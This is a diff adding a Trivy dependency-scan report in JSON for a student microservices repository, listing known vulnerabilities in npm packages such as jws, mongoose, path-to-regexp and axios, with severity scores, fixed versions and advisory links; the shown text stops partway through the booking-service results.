@@ -1,0 +1,2320 @@
+{
+  "SchemaVersion": 2,
+  "CreatedAt": "2026-07-02T17:07:36.787367389Z",
+  "ArtifactName": ".",
+  "ArtifactType": "filesystem",
+  "Metadata": {
+    "RepoURL": "git@github.com:IMarcusDev/30735_T2_U3_DSS.git",
+    "Branch": "main",
+    "Commit": "bf81d1058b6d320ccf369b18868b4ff597ecae8b",
+    "CommitMsg": "fix: new version of trivy",
+    "Author": "IMarcusDev \u003cescobarmarcos511@gmail.com\u003e",
+    "Committer": "IMarcusDev \u003cescobarmarcos511@gmail.com\u003e"
+  },
+  "Results": [
+    {
+      "Target": "auth-service/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2025-65945",
+          "PkgID": "jws@3.2.2",
+          "PkgName": "jws",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/jws@3.2.2",
+            "UID": "3e89a1eb13a56800"
+          },
+          "InstalledVersion": "3.2.2",
+          "FixedVersion": "3.2.3, 4.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-65945",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-jws: auth0/node-jws: Improper signature verification in HS256 algorithm",
+          "Description": "auth0/node-jws is a JSON Web Signature implementation for Node.js. In versions 3.2.2 and earlier and version 4.0.0, auth0/node-jws has an improper signature verification vulnerability when using the HS256 algorithm under specific conditions. Applications are affected when they use the jws.createVerify() function for HMAC algorithms and use user-provided data from the JSON Web Signature protected header or payload in HMAC secret lookup routines, which can allow attackers to bypass signature verification. This issue has been patched in versions 3.2.3 and 4.0.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-65945",
+            "https://github.com/auth0/node-jws",
+            "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e",
+            "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6",
+            "https://github.com/auth0/node-jws/releases/tag/v3.2.3",
+            "https://github.com/auth0/node-jws/releases/tag/v4.0.1",
+            "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-65945",
+            "https://www.cve.org/CVERecord?id=CVE-2025-65945"
+          ],
+          "PublishedDate": "2025-12-04T19:16:05.55Z",
+          "LastModifiedDate": "2026-06-17T09:56:06.31Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42334",
+          "PkgID": "mongoose@8.15.2",
+          "PkgName": "mongoose",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/mongoose@8.15.2",
+            "UID": "b40b55101497dbd6"
+          },
+          "InstalledVersion": "8.15.2",
+          "FixedVersion": "6.13.9, 7.8.9, 8.22.1, 9.1.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42334",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Mongoose's Improper Sanitization of $nor in sanitizeFilter May Allow NoSQL Injection",
+          "Description": "Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment. Prior to 6.13.9, 7.8.9, 8.22.1, and 9.1.6, a vulnerability allows bypassing Mongoose’s sanitizeFilter query sanitization mechanism via the $nor operator. When sanitizeFilter is enabled, Mongoose wraps query operators in $eq to neutralize them. However, prior to the fix, $nor was not included in the set of logical operators that are recursively sanitized. Because $nor accepts an array (like $and and $or), and arrays do not trigger hasDollarKeys(), malicious operators such as $ne, $gt, or $regex could be injected inside a $nor clause without being sanitized. This vulnerability is fixed in 6.13.9, 7.8.9, 8.22.1, and 9.1.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-74"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/Automattic/mongoose",
+            "https://github.com/Automattic/mongoose/security/advisories/GHSA-wpg9-53fq-2r8h",
+            "https://mongoosejs.com/docs/api/mongoose.html#Mongoose.prototype.sanitizeFilter()",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42334",
+            "https://thecodebarbarian.com/whats-new-in-mongoose-6-sanitizefilter.html"
+          ],
+          "PublishedDate": "2026-05-14T18:16:47.747Z",
+          "LastModifiedDate": "2026-06-17T10:47:42.1Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-4926",
+          "PkgID": "path-to-regexp@8.2.0",
+          "PkgName": "path-to-regexp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/path-to-regexp@8.2.0",
+            "UID": "95f17bec1cc626aa"
+          },
+          "InstalledVersion": "8.2.0",
+          "FixedVersion": "8.4.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4926",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "path-to-regexp: path-to-regexp: Denial of Service via crafted regular expressions",
+          "Description": "Impact:\n\nA bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.\n\nPatches:\n\nFixed in version 8.4.0.\n\nWorkarounds:\n\nLimit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10153",
+            "https://access.redhat.com/errata/RHSA-2026:10172",
+            "https://access.redhat.com/errata/RHSA-2026:10175",
+            "https://access.redhat.com/errata/RHSA-2026:13545",
+            "https://access.redhat.com/errata/RHSA-2026:13826",
+            "https://access.redhat.com/errata/RHSA-2026:17789",
+            "https://access.redhat.com/errata/RHSA-2026:19409",
+            "https://access.redhat.com/errata/RHSA-2026:19410",
+            "https://access.redhat.com/errata/RHSA-2026:24761",
+            "https://access.redhat.com/errata/RHSA-2026:24762",
+            "https://access.redhat.com/errata/RHSA-2026:24866",
+            "https://access.redhat.com/errata/RHSA-2026:9385",
+            "https://access.redhat.com/errata/RHSA-2026:9742",
+            "https://access.redhat.com/security/cve/CVE-2026-4926",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2451867",
+            "https://cna.openjsf.org/security-advisories.html",
+            "https://github.com/pillarjs/path-to-regexp",
+            "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-j3q9-mxjg-w52f",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4926",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-4926.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4926"
+          ],
+          "PublishedDate": "2026-03-26T19:17:08.387Z",
+          "LastModifiedDate": "2026-06-30T03:20:44.527Z"
+        }
+      ]
+    },
+    {
+      "Target": "booking-service/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2025-58754",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.12.0, 0.30.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-58754",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios DoS via lack of data size check",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. When Axios starting in version 0.28.0 and prior to versions 0.30.2 and 1.12.0 runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response. This path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`. Versions 0.30.2 and 1.12.0 contain a patch for the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-58754",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593",
+            "https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67",
+            "https://github.com/axios/axios/commit/c30252f685e8f4326722de84923fcbc8cf557f06",
+            "https://github.com/axios/axios/pull/7011",
+            "https://github.com/axios/axios/pull/7034",
+            "https://github.com/axios/axios/releases/tag/v0.30.2",
+            "https://github.com/axios/axios/releases/tag/v1.12.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-58754",
+            "https://www.cve.org/CVERecord?id=CVE-2025-58754"
+          ],
+          "PublishedDate": "2025-09-12T02:15:46.873Z",
+          "LastModifiedDate": "2026-06-17T09:44:52.797Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-25639",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.13.5, 0.30.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-25639",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-754",
+            "CWE-1287"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10184",
+            "https://access.redhat.com/errata/RHSA-2026:11414",
+            "https://access.redhat.com/errata/RHSA-2026:13542",
+            "https://access.redhat.com/errata/RHSA-2026:13548",
+            "https://access.redhat.com/errata/RHSA-2026:19712",
+            "https://access.redhat.com/errata/RHSA-2026:25041",
+            "https://access.redhat.com/errata/RHSA-2026:2694",
+            "https://access.redhat.com/errata/RHSA-2026:3087",
+            "https://access.redhat.com/errata/RHSA-2026:3105",
+            "https://access.redhat.com/errata/RHSA-2026:3106",
+            "https://access.redhat.com/errata/RHSA-2026:3107",
+            "https://access.redhat.com/errata/RHSA-2026:3109",
+            "https://access.redhat.com/errata/RHSA-2026:4942",
+            "https://access.redhat.com/errata/RHSA-2026:5142",
+            "https://access.redhat.com/errata/RHSA-2026:5168",
+            "https://access.redhat.com/errata/RHSA-2026:5174",
+            "https://access.redhat.com/errata/RHSA-2026:5633",
+            "https://access.redhat.com/errata/RHSA-2026:5636",
+            "https://access.redhat.com/errata/RHSA-2026:5665",
+            "https://access.redhat.com/errata/RHSA-2026:5807",
+            "https://access.redhat.com/errata/RHSA-2026:6170",
+            "https://access.redhat.com/errata/RHSA-2026:6174",
+            "https://access.redhat.com/errata/RHSA-2026:6192",
+            "https://access.redhat.com/errata/RHSA-2026:6277",
+            "https://access.redhat.com/errata/RHSA-2026:6308",
+            "https://access.redhat.com/errata/RHSA-2026:6309",
+            "https://access.redhat.com/errata/RHSA-2026:6428",
+            "https://access.redhat.com/errata/RHSA-2026:6497",
+            "https://access.redhat.com/errata/RHSA-2026:6567",
+            "https://access.redhat.com/errata/RHSA-2026:6568",
+            "https://access.redhat.com/errata/RHSA-2026:6802",
+            "https://access.redhat.com/errata/RHSA-2026:7249",
+            "https://access.redhat.com/errata/RHSA-2026:8218",
+            "https://access.redhat.com/errata/RHSA-2026:8229",
+            "https://access.redhat.com/errata/RHSA-2026:8499",
+            "https://access.redhat.com/errata/RHSA-2026:8500",
+            "https://access.redhat.com/errata/RHSA-2026:8501",
+            "https://access.redhat.com/errata/RHSA-2026:9848",
+            "https://access.redhat.com/security/cve/CVE-2026-25639",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2438237",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/28c721588c7a77e7503d0a434e016f852c597b57",
+            "https://github.com/axios/axios/commit/d7ff1409c68168d3057fc3891f911b2b92616f9e",
+            "https://github.com/axios/axios/pull/7369",
+            "https://github.com/axios/axios/pull/7388",
+            "https://github.com/axios/axios/releases/tag/v0.30.3",
+            "https://github.com/axios/axios/releases/tag/v1.13.5",
+            "https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-25639",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-25639.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-25639"
+          ],
+          "PublishedDate": "2026-02-09T21:15:49.01Z",
+          "LastModifiedDate": "2026-07-01T13:16:50.17Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42033",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.15.1, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42033",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: HTTP Transport Hijacking via Prototype Pollution",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when Object.prototype has been polluted by any co-dependency with keys that axios reads without a hasOwnProperty guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:14937",
+            "https://access.redhat.com/errata/RHSA-2026:16476",
+            "https://access.redhat.com/errata/RHSA-2026:16532",
+            "https://access.redhat.com/errata/RHSA-2026:16534",
+            "https://access.redhat.com/errata/RHSA-2026:16535",
+            "https://access.redhat.com/errata/RHSA-2026:16542",
+            "https://access.redhat.com/errata/RHSA-2026:16874",
+            "https://access.redhat.com/errata/RHSA-2026:17468",
+            "https://access.redhat.com/errata/RHSA-2026:17474",
+            "https://access.redhat.com/errata/RHSA-2026:17657",
+            "https://access.redhat.com/errata/RHSA-2026:17699",
+            "https://access.redhat.com/errata/RHSA-2026:19109",
+            "https://access.redhat.com/errata/RHSA-2026:19375",
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:21017",
+            "https://access.redhat.com/errata/RHSA-2026:21338",
+            "https://access.redhat.com/errata/RHSA-2026:21772",
+            "https://access.redhat.com/errata/RHSA-2026:22465",
+            "https://access.redhat.com/errata/RHSA-2026:22619",
+            "https://access.redhat.com/errata/RHSA-2026:22629",
+            "https://access.redhat.com/errata/RHSA-2026:22840",
+            "https://access.redhat.com/errata/RHSA-2026:23361",
+            "https://access.redhat.com/errata/RHSA-2026:24536",
+            "https://access.redhat.com/errata/RHSA-2026:24539",
+            "https://access.redhat.com/errata/RHSA-2026:24853",
+            "https://access.redhat.com/errata/RHSA-2026:24977",
+            "https://access.redhat.com/errata/RHSA-2026:25041",
+            "https://access.redhat.com/errata/RHSA-2026:25089",
+            "https://access.redhat.com/errata/RHSA-2026:25271",
+            "https://access.redhat.com/errata/RHSA-2026:25273",
+            "https://access.redhat.com/errata/RHSA-2026:26214",
+            "https://access.redhat.com/errata/RHSA-2026:26225",
+            "https://access.redhat.com/errata/RHSA-2026:26232",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/security/cve/CVE-2026-42033",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2461607",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42033",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42033.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42033"
+          ],
+          "PublishedDate": "2026-04-24T18:16:29.993Z",
+          "LastModifiedDate": "2026-07-01T13:17:15.357Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42035",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.15.1, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42035",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Arbitrary HTTP header injection via prototype pollution",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, a prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request. The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-113",
+            "CWE-1321"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42035",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-6chq-wfr3-2hj9",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42035",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42035"
+          ],
+          "PublishedDate": "2026-04-24T18:16:30.273Z",
+          "LastModifiedDate": "2026-06-17T10:47:20.66Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42043",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.15.1, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42043",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: NO_PROXY bypass via crafted URL",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, an attacker who can influence the target URL of an Axios request can use any address in the 127.0.0.0/8 range (other than 127.0.0.1) to completely bypass the NO_PROXY protection. This vulnerability is due to an incomplete for CVE-2025-62718, This vulnerability is fixed in 1.15.1 and 0.31.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-183",
+            "CWE-441",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+              "V3Score": 7.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
+              "V3Score": 10
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+              "V3Score": 7.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:14937",
+            "https://access.redhat.com/errata/RHSA-2026:16476",
+            "https://access.redhat.com/errata/RHSA-2026:16532",
+            "https://access.redhat.com/errata/RHSA-2026:16534",
+            "https://access.redhat.com/errata/RHSA-2026:16535",
+            "https://access.redhat.com/errata/RHSA-2026:16542",
+            "https://access.redhat.com/errata/RHSA-2026:16874",
+            "https://access.redhat.com/errata/RHSA-2026:17468",
+            "https://access.redhat.com/errata/RHSA-2026:17474",
+            "https://access.redhat.com/errata/RHSA-2026:17657",
+            "https://access.redhat.com/errata/RHSA-2026:17699",
+            "https://access.redhat.com/errata/RHSA-2026:19109",
+            "https://access.redhat.com/errata/RHSA-2026:19375",
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:21017",
+            "https://access.redhat.com/errata/RHSA-2026:21338",
+            "https://access.redhat.com/errata/RHSA-2026:21772",
+            "https://access.redhat.com/errata/RHSA-2026:22465",
+            "https://access.redhat.com/errata/RHSA-2026:22619",
+            "https://access.redhat.com/errata/RHSA-2026:22629",
+            "https://access.redhat.com/errata/RHSA-2026:22840",
+            "https://access.redhat.com/errata/RHSA-2026:23361",
+            "https://access.redhat.com/errata/RHSA-2026:24536",
+            "https://access.redhat.com/errata/RHSA-2026:24539",
+            "https://access.redhat.com/errata/RHSA-2026:24853",
+            "https://access.redhat.com/errata/RHSA-2026:24977",
+            "https://access.redhat.com/errata/RHSA-2026:25041",
+            "https://access.redhat.com/errata/RHSA-2026:25089",
+            "https://access.redhat.com/errata/RHSA-2026:25271",
+            "https://access.redhat.com/errata/RHSA-2026:25273",
+            "https://access.redhat.com/errata/RHSA-2026:26214",
+            "https://access.redhat.com/errata/RHSA-2026:26225",
+            "https://access.redhat.com/errata/RHSA-2026:26232",
+            "https://access.redhat.com/errata/RHSA-2026:26234",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/security/cve/CVE-2026-42043",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2461626",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42043",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42043.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42043"
+          ],
+          "PublishedDate": "2026-04-24T18:16:31.457Z",
+          "LastModifiedDate": "2026-07-01T13:17:17.25Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42264",
+          "PkgID": "axios@1.10.0",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.10.0",
+            "UID": "61b70360d23ff120"
+          },
+          "InstalledVersion": "1.10.0",
+          "FixedVersion": "1.15.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42264",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Prototype pollution allows information disclosure and request manipulation",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. From version 1.0.0 to before version 1.15.2, fFive config properties (auth, baseURL, socketPath, beforeRedirect, and insecureHTTPParser) in the HTTP adapter are read via direct property access without hasOwnProperty guards, making them exploitable as prototype pollution gadgets. When Object.prototype is polluted by another dependency in the same process, axios silently picks up these polluted values on every outbound HTTP request. This issue has been patched in version 1.15.2.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/security/cve/CVE-2026-42264",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467927",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/47915144662f2733e6c051bdcb895a8c8f0586aa",
+            "https://github.com/axios/axios/pull/10779",
+            "https://github.com/axios/axios/releases/tag/v1.15.2",
+            "https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42264",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42264.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42264"
+          ],
+          "PublishedDate": "2026-05-08T04:16:20.313Z",
+          "LastModifiedDate": "2026-07-02T12:17:16.507Z"
+        },
+        {
